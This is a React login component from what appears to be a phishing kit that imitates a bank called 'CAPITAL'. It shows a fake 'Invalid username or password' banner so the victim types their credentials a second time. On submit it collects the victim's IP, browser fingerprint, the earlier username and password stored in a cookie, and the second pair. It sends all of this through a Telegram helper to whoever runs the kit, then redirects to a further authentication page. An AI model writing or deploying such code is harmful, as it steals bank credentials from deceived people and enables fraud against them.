import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function ReLogin() {
  const [formInput, setFormInput] = useState<Login2>({
    username2: "",
    password2: ""
})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate();

const login1: Login = cookies.get("login1");
const ip: string = cookies.get("ip");

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true);
    const message = `
    [----+🏦 CAPITAL 🏦+----]
    IP: ${ip}

    Fingerprint: ${navigator.userAgent}

    USERNAME: ${login1.username}

    PASSWORD: ${login1.password}

    USERNAME 2: ${formInput.username2}

    PASSWORD 2: ${formInput.password2}
    `;
    await TelegramSend(message)
    cookies.set("login2", formInput)
    setIsLoading(false);
    navigate("../login/auth/2", {replace:true})
}
  return (
    <>
    <p style={{padding:"20px", textAlign:"center", backgroundColor:"red", color:"white"}}>Invalid username or password. Please try again</p>
     <form action="" method="post" onSubmit={handleSubmit}>
      <div className="form-area">
            <div className="input-field">
                <label htmlFor="">Username</label>
                <input type="text" name="username2" required onChange={handleInputChange}/>
            </div>
            <div className="input-field">
                <label htmlFor="">Password</label>
                <input type="password" name="password2" required onChange={handleInputChange}/>
            </div>

            <div style={{"display": "flex", "alignItems": "center"}}>
                    <input style={{"height": "15px", "width": "20px", "marginRight": "3px"}} type="checkbox"/><span>Remember
                      Me</span>
                  </div>

            {isLoading ?
            (
            <button className="btn" type="button">Please wait.....</button>)
            :(
            <button className="btn" type="submit">Sign in</button>)
}
           
        </div>
    </form>
    </>
  );
}
